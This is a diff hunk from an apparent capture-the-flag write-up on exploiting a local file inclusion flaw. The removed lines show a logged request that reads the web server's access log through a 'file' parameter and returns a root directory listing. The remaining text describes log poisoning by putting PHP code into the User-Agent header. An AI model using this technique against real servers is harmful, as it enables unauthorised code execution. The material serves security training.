@@ -191,30 +191,6 @@ We request the same request again and see the request is passing Burpsuite:
 
 ![ImgPlaceholder](screenshots/burpsuite_access_logfile.png)
 
-```
-10.10.14.28 - - [11/Jan/2021:01:35:42 +0100] "GET /browse.php?file=%2Fvar%2Flog%2Fhttpd-access.log HTTP/1.1" 200 12152918 "-" "Mozilla/5.0 COPYRIGHT
-bin
-boot
-dev
-entropy
-etc
-home
-lib
-libexec
-media
-mnt
-net
-proc
-rescue
-root
-sbin
-sys
-tmp
-usr
-var
- Firefox/78.0"
-```
-
 Now we can use Burpsuite to pass a php script using the User-Agent header, which is logged with the logfiles.
 
 This can be passed inside the User-Agent header parameters:
